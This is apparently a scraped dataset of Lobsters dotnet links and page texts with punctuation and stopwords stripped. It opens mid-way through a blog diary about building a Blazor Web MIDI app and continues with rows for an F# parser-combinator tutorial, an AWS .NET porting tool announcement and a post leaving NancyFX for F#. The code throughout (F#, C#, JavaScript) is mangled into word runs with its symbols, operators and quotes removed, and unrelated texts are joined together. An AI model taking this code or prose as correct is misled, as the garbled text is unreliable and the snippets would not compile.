specifically midi access apparently thing work slightly differently saved fiddle let try saving midi ready hurray test list midi port copypaste example fiddle couple extra line differentiate input output call listinputsandouptuts midi ready input port input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined output port output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined hmm ideal clearly found port six input output expect one two use property add consolelog output loop show entry key value foreach get suggesting example iterating property collection rather entry using var input midiaccessinputsvalues still give anything obviously useful keep mind know little javascript sure answer obvious many let try using foreach instead like function listinputsandoutputs midiaccess consolelog input port midiaccessinputsforeach input consolelog input port type inputtype id inputid manufacturer inputmanufacturer name inputname version inputversion consolelog output port midiaccessoutputsforeach output consolelog output port type outputtype id outputid manufacturer outputmanufacturer name outputname version outputversion output much promising midi ready input port input port type input id manufacturer microsoft corporation name version output port output port type output id manufacturer microsoft corporation name version test dump midi message console hardcode input output port id get c something reasonable adapting example web midi doc slightly get function logmidimessage message var line midi message var eventdatalength line eventdata tostring consolelog line function onmidisuccess midiaccess var input midiaccessinputsget inputonmidimessage logmidimessage hit drum see midi message likewise make change module eg switching kit get reported well know sysex message working test request name kit timestamp point need go back vdrum explorer code doc kit name first byte kitcommon container start kit container kit container kit start need create data request message byte starting address hijacking command console app getting print midi message need send byte easy enough adapting example web midi note annoyance point forking jsfiddle seem working properly get new id change title way show fiddle properly ah look like need fork change title set base ideal work expect code work var output midiaccessoutputsget var requestmessage outputsend requestmessage see sign kit sent back response worse add consolelog send script get logged either maybe throwing exception aha yes exception failed execute send midioutput system exclusive message allowed index ah requestmidiaccess call specifically requesting sysex access interesting able receive sysex message even though send changing call pas sysex true get back midi message look like probably contains kit name hooray step done timestamp took hour bad step vanilla blazor project okay within existing vdrumexplorer solution add new project find blazor project template choose get interested aspnet core hosted option may want eventually let bother sidethought nothosted version may able try hosting file google cloud storage hmmm let try build oh failed resolveblazorruntimedependencies task failed unexpectedly error systemiofilenotfoundexception could load file assembly vdrumexplorerblazordll one dependency system find file specified surprising also surprising look like got aspnet core given tick box visual studio update maybe help upgrading good measure let blow away new project case project template changed time make try new nope still failing way wonder whether pinned net core sdk older version causing problem ah yes globaljson file drum specifies aha updating use work bit time wasted bad running app work including hitting breakpoint time move onto midi stuff timestamp step listing midi port blazor substep create new page let create new razor page thought would add new item razor page come cshtml file instead razor file everything else maybe despite page directory razor extension razor page razor component look like feeling could get depth really rapidly properly read bunch doc razor various talk used done either quite read fundamental first hack copy paste experiment approach learning new technology generally feel little le comfortable latter definitely get result quicker provide good foundation real work still firmly experimentation territory hack new page initialize midi button two label input port output port add nav menu run seems well eventually may want make default landing page come later time dive j substep initialize midi let rush listing port initializing midi would good add status field label start looking j interop heard blazor university probably good starting point yes section javascript interop worryingly far toc ie skipping awful lot information get far plough calling requestmidiaccess function initializemidi relatively straightforward one caveat know express result type know javascript promise refer within c code let use object start private async task initializemidi var promise await jsruntimeinvokeasync object navigatorrequestmidiaccess timespanfromseconds looking carefully docuemntation look like effectively keep reference javascript object within c code everything basically json serializeddeserialized across boundary fairly reasonable mean need write javascript code suspect plan write bunch javascript code razor page yes want move keep global midi variable keep initialized midi access declare javascript function everything need midi basically proxy midi variable really hoped avoid writing javascript running blazor never mind plan fails first step meant write script within razor page okay let create midijs script include indexhtml unfortunately asynchrony turn tricky really want able pas callback javascript code involves creating dotnetobjectreference managing lifetime slightly annoying fiddly come back eventually keep state javascript ask status waiting second private async task initializemidi await jsruntimeinvokeasync object initializemidi timespanfromseconds await taskdelay status await jsruntimeinvokeasync string getmidistatus result yes see midi initialized c code fetch status javascript time meeting come back look making javascript bit cleaner writing callback timestamp substep use callback better library pattern timestamp back currently midijs file introduces function global namespace let follow javascript best practice page guidance instead var midi function var access null var status uninitialized function initialize success function midiaccess access midiaccess status initialized failure message status failed message navigatorrequestmidiaccess sysex true success failure function getstatus return status return initialize initialize getstatus getstatus actually good really know least good enough next let work callback ideally able return something javascript initialize method await interesting blog post really long criticism great post explains everything really well involved suspect bit hackery allow simpler le elegant solution fine let create promisehandler class proxy object javascript using microsoftjsinterop using system using systemthreadingtasks namespace vdrumexplorerblazor public class promisehandler idisposable public dotnetobjectreference promisehandler proxy get private readonly taskcompletionsource int tc public promisehandler proxy dotnetobjectreferencecreate tc new taskcompletionsource int jsinvokable public void success tcstrysetresult jsinvokable public void failure string message tcstrysetexception new exception message public task task tcstask public void dispose proxydispose create instance initializemidi pas proxy javascript private async task initializemidi var handler new promisehandler await jsruntimeinvokeasync object midiinitialize timespanfromseconds handlerproxy try await handlertask status initialized catch exception e status initialization failed emessage javascript us proxy object promise handling function initialize handler success function midiaccess access midiaccess handlerinvokemethodasync success failure message handlerinvokemethodasync failure message navigatorrequestmidiaccess sysex true success failure quite explicit seems job least take long get working timestamp substep listing midi port listing port involve promise involve iterator dubious able return directly let create array javascript copy port function getinputports var ret accessinputsforeach input retpush id inputid name inputname return ret initially tried pushing input array way end data clear json returned across jsnet boundary match expected net need declare class receive data public class midiport jsonpropertyname id public string id get set jsonpropertyname name public string name get set get input port display via field hooked razor page var input await jsruntimeinvokeasync list midiport midigetinputports timeout inputdevices stringjoin inputsselect input inputid inputname success timestamp surprisingly quick step retrieve kit name blazor need two extra bit midi functionality sending receiving data hoping exchanging byte array via blazor straightforward matter creating callback adding function javascript send message add callback message received timestamp okay well turned exchanging byte array quite simple hoped needed j side otherwise transmitted json object discovering went via creating midimessage class might well keep around got receive message timestamp blazor state change detection include call listadd reasonable shame spot observablecollectionadd either though fix calling statehaschanged though ui display message three bit involved well simple midimessage class callback class delegate action public class midimessagehandler idisposable public dotnetobjectreference midimessagehandler proxy get private readonly action midimessage handler public midimessagehandler action midimessage handler proxy dotnetobjectreferencecreate thishandler handler jsinvokable public void onmessagereceived midimessage message handler message public void dispose proxydispose javascript use function addmessagehandler portid handler accessinputsget portid onmidimessage function message need data explicitly let create new object var jsonmessage data windowbtoa messagedata timestamp messagetimestamp handlerinvokemethodasync onmessagereceived jsonmessage c code receive callback subscribe initializemidi var messagehandler new midimessagehandler messagereceived await jsruntimeinvokevoidasync midiaddmessagehandler timeout input id messagehandlerproxy separate method callback could used local method lambda though private void messagereceived midimessage message messagesadd bitconvertertostring messagedata blazor nt know collection changed even make observablecollection statehaschanged timestamp let try sending sysex message request kit easy bit except work log show following error unhandled exception rendering component failed execute send midioutput function found matched signature provided maybe another issue let try explicitly data nope error let try hardcoding data want send using javascript worked work suggests windowatob call behaving expected could use logging let try putting breakpoint javascript done hopefully open chrome console whoa breakpoint worked visual studio instead amazing see atob data returned string array stack overflow question potential option really horrible work work well sort midi message get back much longer expected longer get jsfiddle maybe callback working properly timestamp okay btoa want either stack overflow question go detail accepted answer us ton code rightclicking wwwroot give option clientside library let give go see make side problem simpler timestamp well work library added wwwroot directory trying use midijs added import statement start caused error use import statement outside module guess really need know javascript module whether midijs one hmm time lunch saturday afternoon timestamp back lunch chat parent let another look side note visual studio anything document open taking cpu seem right oh well try import script directly script tag end error uncaught referenceerror export defined bizarrely enough error message often refers libts even made sure typescript library wwwroot okay got work horrible hack copying file wwwroot removing removing everything export may investigate library point fundamentally inabilty correctly encodedecode single timeconsuming frustrating part far sigh also result something happy put github involves copy library file rather using intended timestamp step retrieve kit name blazor okay got notatall decoded kit name successfully let try looping get decoding go involve copying real vdrum explorer code create data request message programmatically decode data set message love add reference vdrumexplorermidi definitely yet need remove commonsmidi reference replace everything use going step timestamp success copying quite bit code everything nothing particularly unexpected stage deeply encouraging going leave day tomorrow try change abstraction used vdrum explorer integrate saturday evening timestamp interlude refactoring midi access okay turn really want wiat tomorrow however next step going code genuinely want keep let commit everything done far new branch go back branch aim step make midi access replaceable need hotreplaceable least yet mind using static property current midi implementation make make difriendly later two project going change vdrumexplorermodel vdrumexplorermidi model refers midi moment midi refers managedmidi library plan move code midi model without reference managedmidi type define interface eg imidiinput imidioutput imidimanager write rest midirelated code refer interface ditch vdrumexplorermidi add vdrumexplorermidimanagedmidi implement model interface term managedmidi library hope tomorrow blazor implementation library confidence work reasonably well done thing audio recordingplayback device naudio implementation project let go timestamp okay went pretty much planned actually able simplify code bit nice potentially refactoring moduleaddress datasegment rolandmidiclient project make rolandmidiclientrequestdataasync accept moduleaddress return datasegment come later though admittedly testing found kit invalid value one instrument need look later think new issue timestamp blazor midi interface implementation wait tomorrow anticipate tricky sunday morning timestamp okay let plan remove code copied rest vdrum explorer blazor project need add reference blazor project vdrumexplorermodel implement midi interface rework code enough get previous functionality working rewrite code hardcoded module address instead detecting right schema listing kit attached supported module maybe publish removing code adding project reference trivial course point code compile choice could get code compiling using midi interface without implementing interface could implement interface first rewriting existing application code despite order listed going rewrite application part first clear error list making easier spot mistake implementing interface downside bit code need stash somewhere part midi implementation eventually without wanting get right yet create webmidi folder implementation scratchpadtxt file copy required right code point getting really annoyed syntax highlighting razor file know petty grey background code really ugly going go code anyway let actually use add new razor page time move code fix two minute later look like v provides least option quite want really want partial class codebehind model entirely possible equivalent case partial class closer right blog post tell exactly need timestamp starting actually perform migration realise need ilogger minute use nulllogger later want implement logger add page already log method simple timestamp quicker expected course know whether work implementing midi interface creating webmidimanager webmidiinput webmidioutput class show little really need code written course moment going worry closing midi connection imidiinputdispose etc leave everything open opened use single netside event handler input port event subscriberemove handling net side manage underlying vdrum explorer interface end getting callback client instance disposal oddity output reused though stateless effectively timestamp okay bad significant surprise although one bit slight ugliness imidioutputsend midimessage method synchronous calling javascript interop always asynchronous happens mostly okay send message meant effectively fireandforget anyway mean call fails spot let see actually nope yet initialization fails read property input null oddly second click button initialize midi although list kit yet maybe timing thing going ah yes forgotten initialization got await initial start promise call await promise handler easy enough okay fixed still listing kit step debugger model code would really help got log implementation point let quickly timestamp great get nice log device detection going input device output device detecting device midi port name device detected midi port skipping known module detected aborting look like receiving response device port request nothing obviously wrong code via quick inspection let add console logging javascript side get clearer picture hmm sending message port object object sound promising port id ah yes simple mistake webmidioutput line runtimeinvokevoidasync midisendmessage runtime messagedata runtimeinvokevoidasync midisendmessage port messagedata amazing often code go wrong soon lean static fix boom work generalizing application code timestamp list kit list anything got connected got fairly nasty code computing module address fetch let see much easier make got full power model project play timestamp turn really easy inefficient public information schema field container store kit name load data one kit time retrieve formatted kit name loaded data involves loading way information really need ideal worked first time first listed kit worked turn turn rerun boom even worked aerophone received last week mostly inittone aerophone split user kit preset kit user kit populated start name repeated kit subname aerophone yet changed code handle hey enough morning certainly honestly expected integration go quickly afternoon investigate hosting option try put code others timestamp tidying blog post bit decided definitely want include code github publish result online mean working library least mitlicensed bad fabulous thing show talk give vdrum explorer everyone laugh javascript course sunday afternoon publishing web site timestamp running dotnet publish c release blazor directory creates output look like able serve statically hoped unchecked aspnet core hosting box project creation one simple way serving static content use google cloud storage uploading file bucket configuring bucket appropriately let give go plan basically follow tutorial got simple indexhtml file working upload blazor application already http load balancing google cloud jonskeetuk domain hosted google domain straightforward take step went tutorial good job sample page working served http new googlemanaged ssl certificate timestamp time upload blazor app brilliant state moment step done want get rid counter sample etc come later somewhatexpecting edit mime type well see google cloud storage browser let upload file yup work admittedly slightly irritating upload directory separately uploading wwwroot would create new wwwroot directory expect using gsutil command line make easier future worked timestamp previous step took minute computer also chasing cat away frog hunting garden tidying blazor app point site really single page need navbar etc timestamp okay look lot better speeding kit name access folk going using though really want speed kit loading let see hard model code timestamp done minute implement new functionality bit le actually due typing going point noting brag emphasize performed integration main model code much comfortable develop really quickly thing either javascript blazor code would much le pleasant republish let try gsutil command mentioning earlier delete everything storage bucket delete previous release build publish dotnet publish c release cd gsutil cp r g vdrumexplorerweb last command explained bit gustil invoke gsutil tool perform operation parallel cp copy r recursively source directory g vdrumexplorerweb target bucket hooray much simpler web interface useful general load balancer updating load balancer keep losing configuration backend bucket certificate strongly suspect created kubernetes engine actually update configuraiton let flow ah turn ingres currently support storage bucket backend create new load balancer could served http without load balancer anything without http support feel pretty ropy course load balancer cost money may keep forever sake single demo app sure afford could useful static site option serve application cluster easy enough matter adding service conclusion okay done amazing weekend thrilled ended got suitable roland instrument try http vdrumexplorerjonskeetuk code github yet expect within week normal place edited initially slightly disappointed seem work phone sure happened tried innitially know still claiming connection insecure managed get site working phone connecting bluetooth running net code talking javascript talking midi bluetooth list content drum really feel like work annoying aspect definitely firstly javascript come reliable implementation situation anyway secondly adding client library rather fraught expected sure doable beyond level expertise overall impressed blazor definitely resurrect noda time blazor app time zone conversion working ago like like loading related
36,Lobsters,dotnet,"C#, F#, .NET programming",Comparing compiler construction in Clojure and F#,https://www.youtube.com/watch?v=t8usj1fN9rs,comparing compiler construction clojure f,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature language language comparing compiler construction clojure f ramsey nasser youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature language language comparing compiler construction clojure f ramsey nasser youtube
37,Lobsters,dotnet,"C#, F#, .NET programming",Understanding Parser Combinators,https://fsharpforfunandprofit.com/posts/understanding-parser-combinators/,understanding parser combinators,slide video talk topic second post third post last post fparsec implementation parsing hardcoded character implementation parsing specified character implementation returning successfailure functional error handling implementation switching curried implementation currying rewriting inner function benefit curried implementation partially apply implementation encapsulating parsing function type testing wrapped function combining two parser sequence combinator functional programming pattern testing choosing two parser combinator testing combining choosing list parser see post monoids review listing parser library far gist summary next post gist information fparsec library understanding parser combinators series comment comment powered disqus blog comment powered,part understanding parser combinators series update slide video talk topic series look socalled work order understand something nothing like building create basic parser library scratch useful finish building complete json parser term like make approach seem complicated rather attempting explain concept front dive start coding build complex stuff incrementally via series implementation implementation slightly different previous one using approach hope stage design concept easy understand end series parser combinators become completely demystified four post series first post look basic concept parser combinators build core library second post build useful library combinators third post work providing helpful error message last post build json parser using parser library obviously focus performance efficiency hope give understanding enable use library like fparsec effectively way big thank stephan tolksdorf created fparsec make first port call net parsing need implementation parsing hardcoded character first implementation create something par single hardcoded character case letter get much simpler work input parser stream character could use something complicated use string stream empty return pair consisting false empty string first character stream return pair consisting true remaining stream character first character stream return false unchanged original stream character code let aparser str stringisnullorempty str false else str let remaining str true remaining else false str signature aparser val aparser string bool string tell u input string output pair consisting boolean result another string remaining input like test first good input let inputabc abc aparser inputabc result see consumed remaining input bc bad input let inputzbc zbc aparser inputzbc give result case first character consumed remaining input still zbc incredibly simple parser understand everything follows easy implementation parsing specified character refactor pas character want match rather hard coded time rather returning true false return message indicating happened call function pchar code let pchar chartomatch str stringisnullorempty str let msg input msg else let first str first chartomatch let remaining str let msg sprintf found c chartomatch msg remaining else let msg sprintf expecting c got c chartomatch first msg str code like previous example except unexpected character shown error message signature pchar val pchar char string string string tell u input pair string character match output pair consisting string result another string remaining input test first good input let inputabc abc pchar inputabc result consumed remaining input bc bad input let inputzbc zbc pchar inputzbc give result expecting got z zbc first character consumed remaining input still zbc pas z parser succeed pchar z inputzbc found z bc implementation returning successfailure want able tell difference successful match failure returning stringlytyped message helpful define special type indicate difference call result type result success failure string success case generic contain value failure case contains error message note using successfailure approach see talk functional error handling rewrite parser return one result case like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg signature pchar val pchar char string result char string tell u output result success case contains matched char remaining input string test first good input let inputabc abc pchar inputabc result consumed remaining input bc also get actual matched char case bad input let inputzbc zbc pchar inputzbc give result failure expecting got z case failure case returned appropriate error message diagram input output implementation switching curried implementation previous implementation input function tuple pair requires pas input functional language like f idiomatic use curried version like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg see difference difference first line even subtle uncurried tuple version let pchar chartomatch str curried version let pchar chartomatch str difference much obvious look type signature signature uncurried tuple version val pchar char string result char string signature curried version val pchar char string result char string curried version pchar represented diagram currying unclear currying work post basically mean multiparameter function written series oneparameter function word twoparameter function signature val add x int int int written equivalent oneparameter function return lambda like let add x fun x return lambda function return inner function like let add x let innerfn x innerfn return innerfn second case inner function used signature look slightly different val add x int int int parenthesis around last parameter ignored signature practical purpose original one original automatic currying two parameter function val add x int int int explicit currying inner function val add x int int int rewriting inner function take advantage currying rewrite parser oneparameter function parameter chartomatch return inner function new implementation inner function cleverly named innerfn let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return inner function innerfn type signature implementation look like val pchar chartomatch char string result char string functionally equivalent previous version char string result char string word implementation identical caller point view twoparameter implementation let pchar chartomatch str oneparameter implementation inner function let pchar chartomatch let innerfn str return inner function innerfn benefit curried implementation nice curried implementation partially apply character want parse like later supply second parameter let inputabc abc parsea inputabc success bc let inputzbc zbc parsea inputzbc failure expecting got z point stop review going pchar function two input provide one input char match result function returned provide second input stream character parsing function creates final result value diagram pchar time emphasis partial application important understand logic moving rest post build basic design implementation encapsulating parsing function type look parsea example see function type val parsea string result char string type bit complicated use encapsulate type called parser like type parser parser string result string encapsulating go design design change implementation simple need change way inner function returned let pchar chartomatch let innerfn str return inner function innerfn let pchar chartomatch let innerfn str return wrapped inner function parser innerfn testing wrapped function ok test let parsea pchar let inputabc abc parsea inputabc compiler error get compiler error error value function applied course function wrapped parser data structure longer directly accessible need helper function extract inner function run input stream call run implementation run let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input run parsea parser various input let inputabc abc run parsea inputabc success bc let inputzbc zbc run parsea inputzbc failure expecting got z got basic parser type hope make sense far combining two parser sequence combinator last implementation good enough basic parsing logic revisit later move level develop way combining parser together mentioned beginning start combining two parser sequence example say want parser match could try writing something like let parsea pchar let parseb pchar b let parseathenb parsea parseb give u compiler error output parsea match input parseb composed like familiar functional programming pattern need chain sequence wrapped type together like happens frequently solution bind function however case implement bind instead go straight andthen implementation implementation logic follows run first parser failure return otherwise run second parser remaining input failure return parser succeed return pair tuple contains parsed value code andthen let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn implementation follows logic described also define infix version andthen use like regular composition note parenthesis needed define custom operator needed infix usage look signature andthen val andthen parser parser b parser b see work two parser different type b testing andthen test see work first create compound parser let parsea pchar let parseb pchar b let parseathenb parsea parseb look type see three value type parser val parsea parser char val parseb parser char val parseathenb parser char char parseathenb type parser char char meaning parsed value pair char since combined parser parseathenb another parser use run run parseathenb abc success b c run parseathenb zbc failure expecting got z run parseathenb azc failure expecting b got z see success case pair b returned also failure happens either letter missing input choosing two parser combinator look another important way combining parser combinator example say want parser match could combine implementation logic would run first parser success return parsed value along remaining input otherwise failure run second parser original case return result success failure second parser code orelse let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn define infix version orelse well look signature orelse val orelse parser parser parser see work two parser must type testing orelse time test first create combined parser let parsea pchar let parseb pchar b let parseaorelseb parsea parseb look type see three value type parser char val parsea parser char val parseb parser char val parseaorelseb parser char run parseaorelseb see successfully handle first character run parseaorelseb azz success zz run parseaorelseb bzz success b zz run parseaorelseb czz failure expecting b got c combining andthen orelse two basic combinators build complex one b c build aandthenborc simpler parser let parsea pchar let parseb pchar b let parsec pchar c let borelsec parseb parsec let aandthenborc parsea borelsec action run aandthenborc abz success b z run aandthenborc acz success c z run aandthenborc qbz failure expecting got q run aandthenborc aqz failure expecting c got q note last example give misleading error say really say attempt fix right later post implement better error message choosing list parser power combinators start kicking orelse toolbox use build even combinators example say want choose list parser rather two well easy pairwise way combining thing extend combining entire list using reduce working reduce see post monoids choose list parser let choice listofparsers listreduce listofparsers note fail input list empty ignore signature choice val choice parser list parser show u expected input list parser output single parser choice available create anyof parser match character list using following logic input list character char list transformed parser char using pchar finally parser combined using choice code choose list character let anyof listofchars listofchars listmap pchar convert parser choice test creating parser lowercase character digit character let parselowercase anyof z let parsedigit anyof test work expected run parselowercase abc success bc run parselowercase abc failure expecting z got run parsedigit success abc run parsedigit success abc run parsedigit abc failure expecting got error message misleading lowercase letter expected digit expected said earlier work error message later post review stop review done created type parser wrapper parsing function parsing function take input eg string attempt match input using criterion baked function match succeeds parsing function return success matched item remaining input match fails parsing function return failure reason failure finally saw way parser could combined make new parser andthen orelse choice listing parser library far complete listing parsing library far line code source code displayed also available gist open system type represents successfailure parsing type result success failure string type wrap parsing function type parser parser string result string parse single character let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return wrapped inner function parser innerfn run parser input let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input combine two parser andthen b let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn infix version andthen let andthen combine two parser orelse b let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn infix version orelse let orelse choose list parser let choice listofparsers listreduce listofparsers choose list character let anyof listofchars listofchars listmap pchar convert parser choice summary post created foundation parsing library simple combinators next post build create library many combinators source code post available gist information interesting using technique production sure investigate fparsec library f optimized realworld usage information parser combinators general search internet haskell library influenced fparsec post example using fparsec try one post understanding parser combinators series understanding parser combinators comment please enable javascript view comment powered disqus blog comment powered
38,Lobsters,dotnet,"C#, F#, .NET programming",Announcing the Porting Assistant for .NET,https://aws.amazon.com/blogs/aws/announcing-the-porting-assistant-for-net/,announcing porting assistant net,microsoft stated porting assistant net analyzing porting application net core sdk credential profile aws command line interface cli download assessed solution get started next ass project reference nuget package apis source file project reference nuget package apis source file project port project save port project deprecated api call port improving suggestion engine github user guide porting assistant net steve,net core future net version net framework last major version released microsoft stated receive bug reliability securityrelated fix going forward application want continue take advantage future investment innovation net platform need consider porting application net core also additional reason consider porting application net core benefiting innovation linux open source improved application scaling performance reducing licensing spend porting however entail significant manual effort undifferentiated updating reference project dependency porting net framework application developer need search compatible nuget package update package reference application project file also need updated net core project file format additionally need discover replacement apis since net core contains subset apis available net framework porting progress developer wade long list compile error warning determine best highest priority place continue chipping away task needle say challenging added friction could deterrent customer large portfolio application today announced porting assistant net new tool help customer analyze port net framework application net core running linux porting assistant net ass application source code full tree public api nuget package dependency identify incompatible net core guide developer compatible replacement available suggestion engine api package replacement designed improve time assistant learns usage pattern frequency missing package apis porting assistant net differs tool able ass full tree package dependency incompatible apis also us solution file starting point make easier ass monolithic solution containing large number project instead analyze aggregate information individual binary ability give developer jump start porting process analyzing porting application getting started porting application using porting assistant net easy couple prerequisite first need install net core sdk secondly need credential profile compatible aws command line interface cli although cli used required credential profile used collect compatibility information public apis package nuget core microsoft package used application public nuget package reference prerequisite taken care download run installer assistant assistant installed check application source code launch porting assistant net start menu previously assessed solution view open assessed solution screen enabling pick left select get started home page begin assessing application solution file asked select credential profile want use also elect optin share telemetry data sharing data help improve suggestion accuracy user time go useful identifying issue hope consider optingin click next browse select solution file want click ass begin analysis post going use open source nopcommerce project note using release version post version still based net framework analysis complete shown overall result number incompatible package application depends apis us incompatible overall portability score score estimation eﬀort required port application net core based number incompatible apis us working porting multiple application use identify prioritize application want start first let dig assessment overview see discovered clicking solution name take detailed dashboard see project make application solution file number incompatible package api dependency along portability score particular project current port status project also listed already begun porting application reopened assessment note project selected project tab data shown project reference nuget package apis source file tab solutionwide scope data wish first selecting project project reference tab show graphical view package dependency see majority dependency consumed case nppcore nppservices nppwebframework project view help decide might want start first get bang buck begin also select project see specific dependency clearly nuget package tab give look compatible incompatible dependency suggested replacement available apis tab list incompatible apis package many time referenced source file list source file making project application indication many incompatible api call found file selecting source file open view showing incompatible apis used suggested package version upgrade exist resolve issue suggested replacement simply updating different package version need crack open source editor update code use different api approach looking report dependencyregistrarcs exists nopweb project us autofac nuget package let start porting application starting nopcore project first navigate back project tab select project click port project porting tool help update project reference nuget package also update project file newer net core format option either making copy application solution file project file source file change made inplace elected make copy clicking save copy application source code selected location open port project view set new target framework version case list nuget dependency project need upgrade incompatible package porting assistant net give list possible version upgrade version shown number incompatible apis either remain additionally become incompatible package selected difference case later version potentially increase number incompatible apis would need manually fix source code indication help make tradeoff decision around whether upgrade latest version package stay older one select version deprecated api call field alongside package give reminder need fix code editor clicking value summarizes deprecated call continue process package dependency ready click port reference updated using ide go source file work replacing incompatible api call using porting assistant net source file deprecated api list view reference follow similar process project application improving suggestion engine suggestion engine behind porting assistant net designed learn give improved result time customer optin sharing telemetry data model behind engine result analyzing hundred thousand unique package million package version available github hope consider helping improve accuracy completeness result contributing data user guide give detail data used porting assistant net free use available steve
39,Lobsters,dotnet,"C#, F#, .NET programming","Goodbye NancyFX, Hello F#",https://blog.jonathanchannon.com/2020-06-16-goodbye-nancyfx-hello-fsharp/,goodbye nancyfx hello f,andreas håkansson carter feeling net os one example jeremy miller business change tide bytepack blog post aaron stannard refocusing energy answer f fake konrad konkosa introduction functional programming f ian russell syme taskbuilder giraffe krzysztof cieślak eugene auduchinok npgsqlfsharp future softwarepark,may already know nancyfx archived year first commit read announcement information never forget learnt codebase community around especially people involved proud honoured involved massive thank andreas håkansson teaching plenty via skype call early day many also know created carter mind nancy sat top aspnet core approach nancy offering many thing web framework usage carter steadily increased good know people value similar thing achieved nancy however paradoxically feeling brewing sometime effort almost futile feeling net os many argue believe took long think recently many come similar thought one example jeremy miller state try compete kind tool microsoft losing proposition time maybe realize upfront price significant success net os mean microsoft eventually write version whatever done already know last month microsoft openly discussed case released alternative automapper identity server proxy kit whilst using large pr marketing machine tout microsoft love os one thing clear pause think accept fact microsoft business fundamental goal make money could argue contribute os library rather embrace extend extinguish library think counter argument need support solution year instead forking library using code point time required adapt need whilst also publicly stating love os thanks library x look code create repo slowly copy codesolution problem state look released awesome go try azure question ask os library author travelled many year people writing library guise love write code make available side effect free nothing stop releasing code people view still impose licence allows author benefit financially time gone everyone releasing thing free one stand say going charge stuff people would looked funny success story servicestack identity server managed succeed net space believe time come author must unite start charging code even love writing code making available absolutely nothing wrong getting cash could offer licence allowed usage code free hit x need pay successful library started charging money potentially limit microsoft eee approach business paying support library x microsoft come along say hey look released azure cost would ask already paying x library x pay hopefully doubt limit microsoft eee approach keep vibrant ecosystem net moment people pay use microsoft library pay azure fee get support change tide changing net ecosystem united front author start charging library otherwise hit fragmentation potentially worse ecosystem still allowing microsoft wheel clone always going business pay microsoft support matter noone got fired choosing microsoft start changing people mind paying thing believe benefit everyone also need platform allow kind thing something handle payment contract information support contact information etc know bytepack allows non net package hopefully matter time someone else come platform app store great example could work imagine nuget app store downloadpurchase package think concept try buy would work extremely well could nuget app store offered author ability sell package setup ability support package provide contract buyer sort support system people bought package seek support using could onto winner think mad man idea also like link great blog post aaron stannard titled new rule playing microsoft open source sandbox aaron responds debacle winget microsoft new package manager window ripped existing package called appget os developer fill hole window ecosystem microsoft offer job work kind product inside company ghost release competing product appears borrowed heavily design attribute original developer work internet get mad couple great point make incentivize user care project project take os sustainability seriously build profitable business around project care longterm viability stated previously ecosystem need unified approach granted happen overnight need start ball rolling otherwise keep going path giving stuff away free whilst one company make billion dollar back work change people mind paying library support point farcical example tweet buying something igal joking krzysztof could afford waited year money might make f os contribution picking igal perfect illustration thousand people importantly business see os free run business using issue slack channel give support also free context feel free see thing area must change hope believe slow change whilst happening concentrating effort elsewhere continue maintain carter hopefully platform ready buying licence support net os library try luck refocusing energy focus answer f previously toyed f year back using fake build tool get personal reason way reflection fake c j shop trying learn worked whilst trying get thing shipped constantly allow time truly understand going also truly f dsl f trying learn two thing limited time also build script one thing work rarely touch occasion touch forgotten worked back square one however recently constant microsoft os drama mentioned c language feature rolled far quickly time use learn new feature reading tweet f user slowly coming conclusion community people control environment real passion control seemed defined way thing rather appears c stance day different way something c announced read tweet one stating learning c day would know idiomatic c due numerous way thing learning c today much harder would imagine learning year ago fact picture konrad konkosa sum nicely even today write blog post came across reddit post titled tired net bloat hidden magic constant change golang feel like thought also looking tweet reddit post see people similar mindset c year finding hard keep language started reading blog post watching video f started enjoy reading code people written first link would highly recommend introduction functional programming f ian russell series blog post walking syntax etc whilst solving business domain problem important learning f recommend enough also part net dddevent sourcing slack team f channel started ask noob question luckily got lot help lot youtube video pluralsight video watched learnt continued journey last couple month made comment others f thing done reply oh becoming one knew exactly meant think anyone argue f seem air elitism andor segregation around away c example chuckle people made comment fact recent f conference syme f language author addressed point asked community tweet nice thing positive one negative tweet undo positive one reflect f perception regard reminds stance took nancy development full flow new thing arrived aspnet discussion took place often reacted nancy age wonder aspnet team got idea easy worked hard thing part smaller community certain thing norm big fanfair come along microsoft announce new wonderful feature arrived grate somewhat think reaction quite visible amongst f people honest understand coming said knew getting tried walk gently go gun blazing rewarded significantly joining f software foundation slack team joining various channel could see large community people discussing working asking question thing helping beginner without ivory tower pointing laughing welcoming really helped along journey answered noob question without hint christ guy dumb response jubilant perception may included incorrect people proud working attending f conf clear well respected clearly clever guy community trying drive f via community fact day came across taskbuilder third party library interop net task f async implementation c asyncawaittask found f using third party library code design porting f pointing back original author contribution giving due respect deserves point time everything discussed seemed like good place gone learn enjoy found also hit usual learning curve experience coming across new thing go state ah get yay wtaf god dumbass understand going say f perfect silver bullet waiting last five silver bullet worked thought would coming c issue may annoy around tooling tried various language throughout career one thing c done well compared language 